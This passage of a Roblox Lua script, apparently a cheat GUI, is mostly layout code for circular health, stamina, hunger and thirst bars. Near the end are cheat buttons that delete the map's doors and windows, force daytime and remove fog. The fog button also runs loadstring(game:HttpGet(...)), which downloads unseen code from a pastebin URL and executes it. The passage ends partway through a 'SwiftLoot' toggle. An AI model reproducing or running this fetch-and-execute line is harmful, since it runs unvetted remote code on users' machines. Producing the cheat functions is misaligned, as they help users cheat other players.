	Stamina_Fill2.Name = "Stamina_Fill2"
	Stamina_Fill2.Parent = Fills_2
	Stamina_Fill2.AnchorPoint = Vector2.new(0.5, 0.5)
	Stamina_Fill2.BackgroundColor3 = Color3.new(1, 1, 1)
	Stamina_Fill2.BackgroundTransparency = 1
	Stamina_Fill2.BorderSizePixel = 0
	Stamina_Fill2.Position = UDim2.new(0.5, 0, 0.5, 0)
	Stamina_Fill2.Rotation = 100
	Stamina_Fill2.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Stamina_Fill2.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Stamina_Fill2.ZIndex = 3
	Stamina_Fill2.Image = "rbxassetid://2736142304"
	Stamina_Fill2.ImageColor3 = Color3.new(0.219608, 0.831373, 1)
	
	Stamina_Fill3.Name = "Stamina_Fill3"
	Stamina_Fill3.Parent = Fills_2
	Stamina_Fill3.AnchorPoint = Vector2.new(0.5, 0.5)
	Stamina_Fill3.BackgroundColor3 = Color3.new(1, 1, 1)
	Stamina_Fill3.BackgroundTransparency = 1
	Stamina_Fill3.BorderSizePixel = 0
	Stamina_Fill3.Position = UDim2.new(0.5, 0, 0.5, 0)
	Stamina_Fill3.Rotation = 150
	Stamina_Fill3.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Stamina_Fill3.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Stamina_Fill3.ZIndex = 3
	Stamina_Fill3.Image = "rbxassetid://2736142304"
	Stamina_Fill3.ImageColor3 = Color3.new(0.219608, 0.831373, 1)
	
	Stamina_Fill4.Name = "Stamina_Fill4"
	Stamina_Fill4.Parent = Fills_2
	Stamina_Fill4.AnchorPoint = Vector2.new(0.5, 0.5)
	Stamina_Fill4.BackgroundColor3 = Color3.new(1, 1, 1)
	Stamina_Fill4.BackgroundTransparency = 1
	Stamina_Fill4.BorderSizePixel = 0
	Stamina_Fill4.Position = UDim2.new(0.5, 0, 0.5, 0)
	Stamina_Fill4.Rotation = 200
	Stamina_Fill4.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Stamina_Fill4.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Stamina_Fill4.ZIndex = 3
	Stamina_Fill4.Image = "rbxassetid://2736142304"
	Stamina_Fill4.ImageColor3 = Color3.new(0.219608, 0.831373, 1)
	
	Stamina_Fill5.Name = "Stamina_Fill5"
	Stamina_Fill5.Parent = Fills_2
	Stamina_Fill5.AnchorPoint = Vector2.new(0.5, 0.5)
	Stamina_Fill5.BackgroundColor3 = Color3.new(1, 1, 1)
	Stamina_Fill5.BackgroundTransparency = 1
	Stamina_Fill5.BorderSizePixel = 0
	Stamina_Fill5.Position = UDim2.new(0.5, 0, 0.5, 0)
	Stamina_Fill5.Rotation = 250
	Stamina_Fill5.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Stamina_Fill5.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Stamina_Fill5.ZIndex = 3
	Stamina_Fill5.Image = "rbxassetid://2736142304"
	Stamina_Fill5.ImageColor3 = Color3.new(0.219608, 0.831373, 1)
	
	Stamina_Fill6.Name = "Stamina_Fill6"
	Stamina_Fill6.Parent = Fills_2
	Stamina_Fill6.AnchorPoint = Vector2.new(0.5, 0.5)
	Stamina_Fill6.BackgroundColor3 = Color3.new(1, 1, 1)
	Stamina_Fill6.BackgroundTransparency = 1
	Stamina_Fill6.BorderSizePixel = 0
	Stamina_Fill6.Position = UDim2.new(0.5, 0, 0.5, 0)
	Stamina_Fill6.Rotation = 300
	Stamina_Fill6.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Stamina_Fill6.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Stamina_Fill6.ZIndex = 3
	Stamina_Fill6.Image = "rbxassetid://2736142304"
	Stamina_Fill6.ImageColor3 = Color3.new(0.219608, 0.831373, 1)
	
	Icon_2.Name = "Icon"
	Icon_2.Parent = Stamina
	Icon_2.AnchorPoint = Vector2.new(0.5, 0.5)
	Icon_2.BackgroundColor3 = Color3.new(1, 1, 1)
	Icon_2.BackgroundTransparency = 1
	Icon_2.Position = UDim2.new(0.5, 0, 0.735, 0)
	Icon_2.Size = UDim2.new(0.899999976, 0, 0.899999976, 0)
	Icon_2.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Icon_2.ZIndex = 6
	Icon_2.Image = "rbxassetid://2713682747"
	Icon_2.ImageColor3 = Color3.new(0, 0, 0)
	
	ImageLabel_2.Parent = Icon_2
	ImageLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
	ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel_2.BackgroundTransparency = 1
	ImageLabel_2.Position = UDim2.new(0.5, 0, 0.5, 0)
	ImageLabel_2.Size = UDim2.new(0.600000024, 0, 0.600000024, 0)
	ImageLabel_2.Image = "rbxassetid://2513188611"
	ImageLabel_2.ImageColor3 = Color3.new(0.0627451, 0.721569, 1)
	
	Hunger.Name = "Hunger"
	Hunger.Parent = Main
	Hunger.AnchorPoint = Vector2.new(0.5, 0.5)
	Hunger.BackgroundColor3 = Color3.new(1, 1, 1)
	Hunger.BackgroundTransparency = 1
	Hunger.Position = UDim2.new(0.75, 0, 0.639999986, 0)
	Hunger.Size = UDim2.new(0.349999994, 0, 0.349999994, 0)
	Hunger.SizeConstraint = Enum.SizeConstraint.RelativeXX
	
	CirclePart_3.Name = "CirclePart"
	CirclePart_3.Parent = Hunger
	CirclePart_3.AnchorPoint = Vector2.new(0.5, 0.5)
	CirclePart_3.BackgroundColor3 = Color3.new(1, 1, 1)
	CirclePart_3.BackgroundTransparency = 1
	CirclePart_3.Position = UDim2.new(0.5, 0, 0.5, 0)
	CirclePart_3.Size = UDim2.new(1, 0, 1, 0)
	CirclePart_3.SizeConstraint = Enum.SizeConstraint.RelativeXX
	CirclePart_3.ZIndex = 2
	CirclePart_3.Image = "rbxassetid://2713625469"
	
	Backdrop_3.Name = "Backdrop"
	Backdrop_3.Parent = CirclePart_3
	Backdrop_3.AnchorPoint = Vector2.new(0.5, 0.5)
	Backdrop_3.BackgroundColor3 = Color3.new(1, 1, 1)
	Backdrop_3.BackgroundTransparency = 1
	Backdrop_3.Position = UDim2.new(0.5, 0, 0.5, 0)
	Backdrop_3.Size = UDim2.new(1.29999995, 0, 1.29999995, 0)
	Backdrop_3.Image = "rbxassetid://2713682747"
	Backdrop_3.ImageTransparency = 0.30000001192093
	
	Fills_3.Name = "Fills"
	Fills_3.Parent = CirclePart_3
	Fills_3.BackgroundColor3 = Color3.new(1, 1, 1)
	Fills_3.BackgroundTransparency = 1
	Fills_3.Size = UDim2.new(1, 0, 1, 0)
	
	Hunger_Fill1.Name = "Hunger_Fill1"
	Hunger_Fill1.Parent = Fills_3
	Hunger_Fill1.AnchorPoint = Vector2.new(0.5, 0.5)
	Hunger_Fill1.BackgroundColor3 = Color3.new(1, 1, 1)
	Hunger_Fill1.BackgroundTransparency = 1
	Hunger_Fill1.BorderSizePixel = 0
	Hunger_Fill1.Position = UDim2.new(0.5, 0, 0.5, 0)
	Hunger_Fill1.Rotation = 50
	Hunger_Fill1.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Hunger_Fill1.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Hunger_Fill1.ZIndex = 3
	Hunger_Fill1.Image = "rbxassetid://2736142304"
	Hunger_Fill1.ImageColor3 = Color3.new(0.784314, 0.486275, 0.0627451)
	
	Hunger_Fill2.Name = "Hunger_Fill2"
	Hunger_Fill2.Parent = Fills_3
	Hunger_Fill2.AnchorPoint = Vector2.new(0.5, 0.5)
	Hunger_Fill2.BackgroundColor3 = Color3.new(1, 1, 1)
	Hunger_Fill2.BackgroundTransparency = 1
	Hunger_Fill2.BorderSizePixel = 0
	Hunger_Fill2.Position = UDim2.new(0.5, 0, 0.5, 0)
	Hunger_Fill2.Rotation = 100
	Hunger_Fill2.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Hunger_Fill2.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Hunger_Fill2.ZIndex = 3
	Hunger_Fill2.Image = "rbxassetid://2736142304"
	Hunger_Fill2.ImageColor3 = Color3.new(0.784314, 0.486275, 0.0627451)
	
	Hunger_Fill3.Name = "Hunger_Fill3"
	Hunger_Fill3.Parent = Fills_3
	Hunger_Fill3.AnchorPoint = Vector2.new(0.5, 0.5)
	Hunger_Fill3.BackgroundColor3 = Color3.new(1, 1, 1)
	Hunger_Fill3.BackgroundTransparency = 1
	Hunger_Fill3.BorderSizePixel = 0
	Hunger_Fill3.Position = UDim2.new(0.5, 0, 0.5, 0)
	Hunger_Fill3.Rotation = 150
	Hunger_Fill3.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Hunger_Fill3.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Hunger_Fill3.ZIndex = 3
	Hunger_Fill3.Image = "rbxassetid://2736142304"
	Hunger_Fill3.ImageColor3 = Color3.new(0.784314, 0.486275, 0.0627451)
	
	Hunger_Fill4.Name = "Hunger_Fill4"
	Hunger_Fill4.Parent = Fills_3
	Hunger_Fill4.AnchorPoint = Vector2.new(0.5, 0.5)
	Hunger_Fill4.BackgroundColor3 = Color3.new(1, 1, 1)
	Hunger_Fill4.BackgroundTransparency = 1
	Hunger_Fill4.BorderSizePixel = 0
	Hunger_Fill4.Position = UDim2.new(0.5, 0, 0.5, 0)
	Hunger_Fill4.Rotation = 200
	Hunger_Fill4.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Hunger_Fill4.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Hunger_Fill4.ZIndex = 3
	Hunger_Fill4.Image = "rbxassetid://2736142304"
	Hunger_Fill4.ImageColor3 = Color3.new(0.784314, 0.486275, 0.0627451)
	
	Hunger_Fill5.Name = "Hunger_Fill5"
	Hunger_Fill5.Parent = Fills_3
	Hunger_Fill5.AnchorPoint = Vector2.new(0.5, 0.5)
	Hunger_Fill5.BackgroundColor3 = Color3.new(1, 1, 1)
	Hunger_Fill5.BackgroundTransparency = 1
	Hunger_Fill5.BorderSizePixel = 0
	Hunger_Fill5.Position = UDim2.new(0.5, 0, 0.5, 0)
	Hunger_Fill5.Rotation = 250
	Hunger_Fill5.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Hunger_Fill5.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Hunger_Fill5.ZIndex = 3
	Hunger_Fill5.Image = "rbxassetid://2736142304"
	Hunger_Fill5.ImageColor3 = Color3.new(0.784314, 0.486275, 0.0627451)
	
	Hunger_Fill6.Name = "Hunger_Fill6"
	Hunger_Fill6.Parent = Fills_3
	Hunger_Fill6.AnchorPoint = Vector2.new(0.5, 0.5)
	Hunger_Fill6.BackgroundColor3 = Color3.new(1, 1, 1)
	Hunger_Fill6.BackgroundTransparency = 1
	Hunger_Fill6.BorderSizePixel = 0
	Hunger_Fill6.Position = UDim2.new(0.5, 0, 0.5, 0)
	Hunger_Fill6.Rotation = 300
	Hunger_Fill6.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Hunger_Fill6.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Hunger_Fill6.ZIndex = 3
	Hunger_Fill6.Image = "rbxassetid://2736142304"
	Hunger_Fill6.ImageColor3 = Color3.new(0.784314, 0.486275, 0.0627451)
	
	Icon_3.Name = "Icon"
	Icon_3.Parent = Hunger
	Icon_3.AnchorPoint = Vector2.new(0.5, 0.5)
	Icon_3.BackgroundColor3 = Color3.new(1, 1, 1)
	Icon_3.BackgroundTransparency = 1
	Icon_3.Position = UDim2.new(0.5, 0, 0.735, 0)
	Icon_3.Size = UDim2.new(0.899999976, 0, 0.899999976, 0)
	Icon_3.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Icon_3.ZIndex = 6
	Icon_3.Image = "rbxassetid://2713682747"
	Icon_3.ImageColor3 = Color3.new(0, 0, 0)
	
	ImageLabel_3.Parent = Icon_3
	ImageLabel_3.AnchorPoint = Vector2.new(0.5, 0.5)
	ImageLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel_3.BackgroundTransparency = 1
	ImageLabel_3.Position = UDim2.new(0.5, 0, 0.5, 0)
	ImageLabel_3.Size = UDim2.new(0.600000024, 0, 0.600000024, 0)
	ImageLabel_3.Image = "rbxassetid://398941243"
	ImageLabel_3.ImageColor3 = Color3.new(1, 0.662745, 0.368627)
	
	Thirst.Name = "Thirst"
	Thirst.Parent = Main
	Thirst.AnchorPoint = Vector2.new(0.5, 0.5)
	Thirst.BackgroundColor3 = Color3.new(1, 1, 1)
	Thirst.BackgroundTransparency = 1
	Thirst.Position = UDim2.new(0.75, 0, 0.879999995, 0)
	Thirst.Size = UDim2.new(0.349999994, 0, 0.349999994, 0)
	Thirst.SizeConstraint = Enum.SizeConstraint.RelativeXX
	
	CirclePart_4.Name = "CirclePart"
	CirclePart_4.Parent = Thirst
	CirclePart_4.AnchorPoint = Vector2.new(0.5, 0.5)
	CirclePart_4.BackgroundColor3 = Color3.new(1, 1, 1)
	CirclePart_4.BackgroundTransparency = 1
	CirclePart_4.Position = UDim2.new(0.5, 0, 0.5, 0)
	CirclePart_4.Size = UDim2.new(1, 0, 1, 0)
	CirclePart_4.SizeConstraint = Enum.SizeConstraint.RelativeXX
	CirclePart_4.ZIndex = 2
	CirclePart_4.Image = "rbxassetid://2713625469"
	
	Backdrop_4.Name = "Backdrop"
	Backdrop_4.Parent = CirclePart_4
	Backdrop_4.AnchorPoint = Vector2.new(0.5, 0.5)
	Backdrop_4.BackgroundColor3 = Color3.new(1, 1, 1)
	Backdrop_4.BackgroundTransparency = 1
	Backdrop_4.Position = UDim2.new(0.5, 0, 0.5, 0)
	Backdrop_4.Size = UDim2.new(1.29999995, 0, 1.29999995, 0)
	Backdrop_4.Image = "rbxassetid://2713682747"
	Backdrop_4.ImageTransparency = 0.30000001192093
	
	Fills_4.Name = "Fills"
	Fills_4.Parent = CirclePart_4
	Fills_4.BackgroundColor3 = Color3.new(1, 1, 1)
	Fills_4.BackgroundTransparency = 1
	Fills_4.Size = UDim2.new(1, 0, 1, 0)
	
	Thirst_Fill1.Name = "Thirst_Fill1"
	Thirst_Fill1.Parent = Fills_4
	Thirst_Fill1.AnchorPoint = Vector2.new(0.5, 0.5)
	Thirst_Fill1.BackgroundColor3 = Color3.new(1, 1, 1)
	Thirst_Fill1.BackgroundTransparency = 1
	Thirst_Fill1.BorderSizePixel = 0
	Thirst_Fill1.Position = UDim2.new(0.5, 0, 0.5, 0)
	Thirst_Fill1.Rotation = 50
	Thirst_Fill1.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Thirst_Fill1.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Thirst_Fill1.ZIndex = 3
	Thirst_Fill1.Image = "rbxassetid://2736142304"
	Thirst_Fill1.ImageColor3 = Color3.new(0.505882, 0.909804, 1)
	
	Thirst_Fill2.Name = "Thirst_Fill2"
	Thirst_Fill2.Parent = Fills_4
	Thirst_Fill2.AnchorPoint = Vector2.new(0.5, 0.5)
	Thirst_Fill2.BackgroundColor3 = Color3.new(1, 1, 1)
	Thirst_Fill2.BackgroundTransparency = 1
	Thirst_Fill2.BorderSizePixel = 0
	Thirst_Fill2.Position = UDim2.new(0.5, 0, 0.5, 0)
	Thirst_Fill2.Rotation = 100
	Thirst_Fill2.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Thirst_Fill2.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Thirst_Fill2.ZIndex = 3
	Thirst_Fill2.Image = "rbxassetid://2736142304"
	Thirst_Fill2.ImageColor3 = Color3.new(0.505882, 0.909804, 1)
	
	Thirst_Fill3.Name = "Thirst_Fill3"
	Thirst_Fill3.Parent = Fills_4
	Thirst_Fill3.AnchorPoint = Vector2.new(0.5, 0.5)
	Thirst_Fill3.BackgroundColor3 = Color3.new(1, 1, 1)
	Thirst_Fill3.BackgroundTransparency = 1
	Thirst_Fill3.BorderSizePixel = 0
	Thirst_Fill3.Position = UDim2.new(0.5, 0, 0.5, 0)
	Thirst_Fill3.Rotation = 150
	Thirst_Fill3.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Thirst_Fill3.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Thirst_Fill3.ZIndex = 3
	Thirst_Fill3.Image = "rbxassetid://2736142304"
	Thirst_Fill3.ImageColor3 = Color3.new(0.505882, 0.909804, 1)
	
	Thirst_Fill4.Name = "Thirst_Fill4"
	Thirst_Fill4.Parent = Fills_4
	Thirst_Fill4.AnchorPoint = Vector2.new(0.5, 0.5)
	Thirst_Fill4.BackgroundColor3 = Color3.new(1, 1, 1)
	Thirst_Fill4.BackgroundTransparency = 1
	Thirst_Fill4.BorderSizePixel = 0
	Thirst_Fill4.Position = UDim2.new(0.5, 0, 0.5, 0)
	Thirst_Fill4.Rotation = 200
	Thirst_Fill4.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Thirst_Fill4.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Thirst_Fill4.ZIndex = 3
	Thirst_Fill4.Image = "rbxassetid://2736142304"
	Thirst_Fill4.ImageColor3 = Color3.new(0.505882, 0.909804, 1)
	
	Thirst_Fill5.Name = "Thirst_Fill5"
	Thirst_Fill5.Parent = Fills_4
	Thirst_Fill5.AnchorPoint = Vector2.new(0.5, 0.5)
	Thirst_Fill5.BackgroundColor3 = Color3.new(1, 1, 1)
	Thirst_Fill5.BackgroundTransparency = 1
	Thirst_Fill5.BorderSizePixel = 0
	Thirst_Fill5.Position = UDim2.new(0.5, 0, 0.5, 0)
	Thirst_Fill5.Rotation = 250
	Thirst_Fill5.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Thirst_Fill5.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Thirst_Fill5.ZIndex = 3
	Thirst_Fill5.Image = "rbxassetid://2736142304"
	Thirst_Fill5.ImageColor3 = Color3.new(0.505882, 0.909804, 1)
	
	Thirst_Fill6.Name = "Thirst_Fill6"
	Thirst_Fill6.Parent = Fills_4
	Thirst_Fill6.AnchorPoint = Vector2.new(0.5, 0.5)
	Thirst_Fill6.BackgroundColor3 = Color3.new(1, 1, 1)
	Thirst_Fill6.BackgroundTransparency = 1
	Thirst_Fill6.BorderSizePixel = 0
	Thirst_Fill6.Position = UDim2.new(0.5, 0, 0.5, 0)
	Thirst_Fill6.Rotation = 300
	Thirst_Fill6.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	Thirst_Fill6.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Thirst_Fill6.ZIndex = 3
	Thirst_Fill6.Image = "rbxassetid://2736142304"
	Thirst_Fill6.ImageColor3 = Color3.new(0.505882, 0.909804, 1)
	
	Icon_4.Name = "Icon"
	Icon_4.Parent = Thirst
	Icon_4.AnchorPoint = Vector2.new(0.5, 0.5)
	Icon_4.BackgroundColor3 = Color3.new(1, 1, 1)
	Icon_4.BackgroundTransparency = 1
	Icon_4.Position = UDim2.new(0.5, 0, 0.735, 0)
	Icon_4.Size = UDim2.new(0.899999976, 0, 0.899999976, 0)
	Icon_4.SizeConstraint = Enum.SizeConstraint.RelativeXX
	Icon_4.ZIndex = 6
	Icon_4.Image = "rbxassetid://2713682747"
	Icon_4.ImageColor3 = Color3.new(0, 0, 0)
	
	ImageLabel_4.Parent = Icon_4
	ImageLabel_4.AnchorPoint = Vector2.new(0.5, 0.5)
	ImageLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel_4.BackgroundTransparency = 1
	ImageLabel_4.Position = UDim2.new(0.5, 0, 0.5, 0)
	ImageLabel_4.Size = UDim2.new(0.5, 0, 0.5, 0)
	ImageLabel_4.Image = "rbxassetid://398941185"
	ImageLabel_4.ImageColor3 = Color3.new(0.666667, 1, 1)
	
	BonusFills_2.Name = "BonusFills"
	BonusFills_2.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusFills_2.Parent = CirclePart_2
	BonusFills_2.BackgroundTransparency = 1
	BonusFills_2.Size = UDim2.new(1, 0, 1, 0)
	
	BonusStamina_Fill1.Name = "BonusStamina_Fill1"
	BonusStamina_Fill1.Parent = BonusFills_2
	BonusStamina_Fill1.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusStamina_Fill1.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusStamina_Fill1.BackgroundTransparency = 1
	BonusStamina_Fill1.BorderSizePixel = 0
	BonusStamina_Fill1.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusStamina_Fill1.Rotation = 50
	BonusStamina_Fill1.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusStamina_Fill1.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusStamina_Fill1.ZIndex = 3
	BonusStamina_Fill1.Image = "rbxassetid://2736142304"
	BonusStamina_Fill1.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusStamina_Fill2.Name = "BonusStamina_Fill2"
	BonusStamina_Fill2.Parent = BonusFills_2
	BonusStamina_Fill2.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusStamina_Fill2.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusStamina_Fill2.BackgroundTransparency = 1
	BonusStamina_Fill2.BorderSizePixel = 0
	BonusStamina_Fill2.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusStamina_Fill2.Rotation = 100
	BonusStamina_Fill2.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusStamina_Fill2.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusStamina_Fill2.ZIndex = 3
	BonusStamina_Fill2.Image = "rbxassetid://2736142304"
	BonusStamina_Fill2.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusStamina_Fill3.Name = "BonusStamina_Fill3"
	BonusStamina_Fill3.Parent = BonusFills_2
	BonusStamina_Fill3.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusStamina_Fill3.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusStamina_Fill3.BackgroundTransparency = 1
	BonusStamina_Fill3.BorderSizePixel = 0
	BonusStamina_Fill3.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusStamina_Fill3.Rotation = 150
	BonusStamina_Fill3.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusStamina_Fill3.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusStamina_Fill3.ZIndex = 3
	BonusStamina_Fill3.Image = "rbxassetid://2736142304"
	BonusStamina_Fill3.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusStamina_Fill4.Name = "BonusStamina_Fill4"
	BonusStamina_Fill4.Parent = BonusFills_2
	BonusStamina_Fill4.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusStamina_Fill4.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusStamina_Fill4.BackgroundTransparency = 1
	BonusStamina_Fill4.BorderSizePixel = 0
	BonusStamina_Fill4.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusStamina_Fill4.Rotation = 200
	BonusStamina_Fill4.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusStamina_Fill4.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusStamina_Fill4.ZIndex = 3
	BonusStamina_Fill4.Image = "rbxassetid://2736142304"
	BonusStamina_Fill4.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusStamina_Fill5.Name = "BonusStamina_Fill5"
	BonusStamina_Fill5.Parent = BonusFills_2
	BonusStamina_Fill5.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusStamina_Fill5.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusStamina_Fill5.BackgroundTransparency = 1
	BonusStamina_Fill5.BorderSizePixel = 0
	BonusStamina_Fill5.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusStamina_Fill5.Rotation = 250
	BonusStamina_Fill5.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusStamina_Fill5.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusStamina_Fill5.ZIndex = 3
	BonusStamina_Fill5.Image = "rbxassetid://2736142304"
	BonusStamina_Fill5.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	BonusStamina_Fill6.Name = "BonusStamina_Fill6"
	BonusStamina_Fill6.Parent = BonusFills_2
	BonusStamina_Fill6.AnchorPoint = Vector2.new(0.5, 0.5)
	BonusStamina_Fill6.BackgroundColor3 = Color3.new(1, 1, 1)
	BonusStamina_Fill6.BackgroundTransparency = 1
	BonusStamina_Fill6.BorderSizePixel = 0
	BonusStamina_Fill6.Position = UDim2.new(0.5, 0, 0.5, 0)
	BonusStamina_Fill6.Rotation = 300
	BonusStamina_Fill6.Size = UDim2.new(1.01999998, 0, 1.01999998, 0)
	BonusStamina_Fill6.SizeConstraint = Enum.SizeConstraint.RelativeXX
	BonusStamina_Fill6.ZIndex = 3
	BonusStamina_Fill6.Image = "rbxassetid://2736142304"
	BonusStamina_Fill6.ImageColor3 = Color3.new(1, 0.682353, 0.0431373)
	
	
	function UpdateBagFillBar(max,amt,element,folder,prefix)
		if max and amt and element and folder and prefix then
		--UPDATE FILL BAR
			local ratio = amt / max
			if amt < 0 then
				ratio = 0
			elseif amt > max then
				ratio = 1
			end
			--UPDATE ROTATIONAL FILL BAR
			local deg = ratio * 300
			local fill = function(rot,val)
				local f = element.CirclePart[folder][prefix.."Fill".. tostring(val)]
				local tweeninfo = TweenInfo.new(0.35)
				local tween = TweenService:Create(f,tweeninfo,{Rotation = rot})
				tween:Play()
			end
			if deg <= 50 then
				fill(deg,1)
				fill(0,2)
				fill(0,3)
				fill(0,4)
				fill(0,5)
				fill(0,6)
			elseif deg > 50 and deg <= 100 then
				fill(50,1)
				fill(deg,2)
				fill(0,3)
				fill(0,4)
				fill(0,5)
				fill(0,6)
			elseif deg > 100 and deg <= 150 then
				fill(60,1)
				fill(120,2)
				fill(deg,3)
				fill(0,4)
				fill(0,5)
				fill(0,6)
			elseif deg > 150 and deg <= 200 then
				fill(50,1)
				fill(100,2)
				fill(150,3)
				fill(deg,4)
				fill(0,5)
				fill(0,6)
			elseif deg > 200 and deg <= 250 then
				fill(50,1)
				fill(100,2)
				fill(150,3)
				fill(200,4)
				fill(deg,5)
				fill(0,6)
			elseif deg > 250 then
				fill(50,1)
				fill(100,2)
				fill(150,3)
				fill(200,4)
				fill(250,5)
				fill(deg,6)
			end
		end
	end
	
	
	
	
				SmartStats.Enabled = true
	
	
	
	while wait(0.1) do
		
		if player.PlayerGui:FindFirstChild("Interface Main") then
			local hotbar = player.PlayerGui["Interface Main"].Hotbar
			
			UpdateBagFillBar(hotbar.Health.Line.AbsoluteSize.X,hotbar.Health.BonusFill.AbsoluteSize.X,Health,"BonusFills","BonusHealth_")
			UpdateBagFillBar(hotbar.Health.Line.AbsoluteSize.X,hotbar.Health.Fill.AbsoluteSize.X,Health,"Fills","Health_")
			UpdateBagFillBar(hotbar.Thirst.Line.AbsoluteSize.X,hotbar.Thirst.Fill.AbsoluteSize.X,Thirst,"Fills","Thirst_")
			UpdateBagFillBar(hotbar.Hunger.Line.AbsoluteSize.X,hotbar.Hunger.Fill.AbsoluteSize.X,Hunger,"Fills","Hunger_")
			UpdateBagFillBar(hotbar.StaminaBar.Line.AbsoluteSize.X,hotbar.StaminaBar.Fill.AbsoluteSize.X,Stamina,"Fills","Stamina_")
			UpdateBagFillBar(hotbar.StaminaBar.Line.AbsoluteSize.X,hotbar.StaminaBar.BonusFill.AbsoluteSize.X,Stamina,"BonusFills","BonusStamina_")
		end
	end
	
	end)
	

end
coroutine.resume(coroutine.create(SCRIPT_UNDW89_FAKESCRIPT))
function SCRIPT_BESR88_FAKESCRIPT() -- RDoorsWindows.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = RDoorsWindows
	script.Parent.MouseButton1Down:connect(function()
		game.Lighting.Sound:play()
	game.StarterGui:SetCore("SendNotification",{
				Title = "Client Map";
				Text = "Doors & Windows Removed.";
				Duration = 6
	        })
		game.Workspace.Map.Shared.Doors:Destroy()
		game.Workspace.Map.Shared.Windows:Destroy()
	end)

end
coroutine.resume(coroutine.create(SCRIPT_BESR88_FAKESCRIPT))
function SCRIPT_NAFP71_FAKESCRIPT() -- SetDay.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = SetDay
	script.Parent.MouseButton1Down:connect(function()
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "Client Map";
				Text = "Time Set Day.";
				Duration = 6
	        })
		game:GetService('RunService').RenderStepped:connect(function()
		game.Lighting.TimeOfDay = 14
		game.Lighting.FogColor = Color3.new(192, 192, 192)
		end)
	end)

end
coroutine.resume(coroutine.create(SCRIPT_NAFP71_FAKESCRIPT))
function SCRIPT_EPCN84_FAKESCRIPT() -- NoFog.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = NoFog
	script.Parent.MouseButton1Down:connect(function()
	game.Lighting.Sound:play()
	game.StarterGui:SetCore("SendNotification",{
				Title = "Client Map";
				Text = "Fog Removed.";
				Duration = 6
	        })
	loadstring(game:HttpGet('https://pastebin.com/raw/pFRJWh6A'))() 
	game.Lighting.FogStart =  999999
	game.Lighting.FogEnd =  999999
	end)

end
coroutine.resume(coroutine.create(SCRIPT_EPCN84_FAKESCRIPT))
function SCRIPT_FYQG81_FAKESCRIPT() -- TextBox.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = TextBox
	script.Parent.FocusLost:connect(function(h)
		SwiftLootSelected = not SwiftLootSelected
		if SwiftLootSelected then
